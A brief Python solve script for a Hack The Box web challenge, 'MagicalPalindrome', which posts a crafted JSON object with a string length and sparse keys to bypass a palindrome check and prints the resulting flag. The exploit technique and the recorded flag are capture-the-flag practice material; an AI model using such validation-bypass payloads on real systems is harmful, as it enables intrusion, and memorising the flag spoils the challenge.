import requests

BASE_URL = "http://154.57.164.75:31992/"
PAYLOAD = '1000'

def hack():
    value = {
        "palindrome":{"length": PAYLOAD, "0": "A", "999": "A"}
        }
    res = requests.post(BASE_URL, json=value)
    print(res.status_code)
    print(res.text)

hack()

# …ekai/hack-web/htb-MagicalPalindrome on  main [?] via  v26.8.1 via 🐍 v3.14.7 (hack-sekai_env) 
# ❯ python3 hack.py
# 200
# Hii Harry!!! HTB{Lum0s_M@x!ma}